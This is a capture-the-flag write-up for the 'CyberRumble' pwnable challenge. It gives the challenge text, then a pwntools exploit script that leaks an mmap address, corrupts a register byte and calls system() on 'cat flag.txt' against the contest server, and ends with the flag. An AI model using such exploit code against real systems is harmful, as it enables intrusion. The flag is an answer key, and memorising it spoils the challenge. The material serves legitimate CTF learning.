# **CyberRumble**

#### tag : pwnable

-----------------------------------------------

#### Description

>Hey you! You're a hacker, right? So am I! Or, at least I thought I was. You see, I'm a big fan of The Undertaker, and I was trying to help him out. He's got an upcoming Hell in a Cell match against Mankind. I wrote some malware I named Undertaker C2 and infected the computers of Mankind's manager with it. The problem is that I accidentally used an old version of this malware, which was before I tested the code and got the bugs worked out. So none of the functionality seems to work! I also lost the source code for this malware. I'm in a real bind, because I need to get information off of that computer to see what Mankind is planning. Here's the malware implant I placed on his computer, please see if you can use it to retrieve any useful information!
>
>nc rumble.sunshinectf.org 4300
>
>Author: hackucf_kcolley (IRC), kcolley (Discord)

-----------------------------------------------

#### Solution

```python
from pwn import *

context.log_level = 'debug'
#r = process('./CyberRumble')
r = remote('rumble.sunshinectf.org', 4300)

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))

# stage 1 : leak mmap address where `cat flag.txt` is stored
p1 = 'old_school '
p1 += 'a' * (0xa-len(p1)+2)
p1 += 'cat flag.txt'

rr('?\n')
ss(p1)
leak = (int((rr('.').split(' ')[-1])[:-1],16))
rr('?\n')
ss('a')
log.info('leak : 0x%x' % leak)

# stage 2 : overwrite 8th byte of rdi to \x00  when system() called in stage 3
p2 = 'old_school '
p2 += 'a' * (0xa-len(p2))
p2 += 'B' * 6   

rr('?\n')
ss(p2)
rr('?\n')
ss('b')

# stage 3 : call system() with rdi which indicate `cat flag.txt`
p3 = 'last_ride '
p3 += p64(leak+1)

rr('?\n')
ss(p3)

r.interactive()
```
**sun{the chair and thumbtacks are ready, but the roof is a little loose}**
